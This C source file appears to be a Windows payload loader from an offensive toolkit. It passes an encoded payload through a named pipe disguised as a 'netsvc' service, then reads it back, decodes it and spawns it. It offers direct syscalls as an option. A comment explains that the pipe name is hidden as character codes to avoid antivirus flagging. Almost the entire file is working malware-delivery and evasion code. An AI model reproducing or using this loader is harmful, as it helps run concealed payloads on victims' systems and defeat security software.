#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

/* a place to track our random-ish pipe name */
char pipename[64];

void server(char * data, int length) {
   DWORD  wrote = 0;
#if USE_SYSCALLS == 1
   HANDLE pipe = create_named_pipe(pipename);
#else
   HANDLE pipe = CreateNamedPipeA(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, 0, 0, 0, NULL);
#endif

   if (pipe == NULL || pipe == INVALID_HANDLE_VALUE)
      return;

#if USE_SYSCALLS == 1
   BOOL result = connect_named_pipe(pipe);
#else
   BOOL result = ConnectNamedPipe(pipe, NULL);
#endif
   if (!result)
      return;

   while (length > 0) {
#if USE_SYSCALLS == 1
      result = write_file(pipe, data, length, &wrote);
#else
      result = WriteFile(pipe, data, length, &wrote, NULL);
#endif
      if (!result)
         break;

      data   += wrote;
      length -= wrote;
   }

#if USE_SYSCALLS == 1
   NtClose(pipe);
#else
   CloseHandle(pipe);
#endif
}

BOOL client(char * buffer, int length) {
   DWORD  read = 0;
#if USE_SYSCALLS == 1
   HANDLE pipe = create_named_pipe_file(pipename);
#else
   HANDLE pipe = CreateFileA(pipename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
#endif
   if (pipe == INVALID_HANDLE_VALUE)
      return FALSE;

   /* read the encoded payload from the pipe */
   while (length > 0) {
#if USE_SYSCALLS == 1
      BOOL result = read_file(pipe, buffer, length, &read);
#else
      BOOL result = ReadFile(pipe, buffer, length, &read, NULL);
#endif
      if (!result)
         break;

      buffer += read;
      length -= read;
   }

#if USE_SYSCALLS == 1
   NtClose(pipe);
#else
   CloseHandle(pipe);
#endif
   return TRUE;
}

DWORD server_thread(LPVOID whatever) {
   phear * payload = (phear *)data;

   /* setup a pipe for our payload */
   server(payload->payload, payload->length);

   return 0;
}

DWORD client_thread(LPVOID whatever) {
   phear * payload = (phear *)data;

   /* allocate data for our "cleaned" payload */
   char * buffer = (char *)malloc(payload->length);

   /* try to connect to the pipe */
   do {
      Sleep(1024);
   }
   while (!client(buffer, payload->length));

   /* spawn our payload */
   spawn(buffer, payload->length, payload->key);

   /* clean up after ourselves */
   free(buffer);

   return 0;
}

void start(HINSTANCE mhandle) {
   /* switched from snprintf... as some A/V product was flagging based on the function *sigh* 
      92, 92, 46, 92, 112, 105, 112, 101, 92 is \\.\pipe\
   
   */
   sprintf(pipename, "%c%c%c%c%c%c%c%c%cnetsvc\\%d", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));

   /* start our server and our client */
#if USE_SYSCALLS == 1
   HANDLE thandle;
   NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &server_thread, NULL, 0, 0, 0, 0, NULL);
#else
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&server_thread, (LPVOID) NULL, 0, NULL);
#endif

   client_thread(NULL);
}
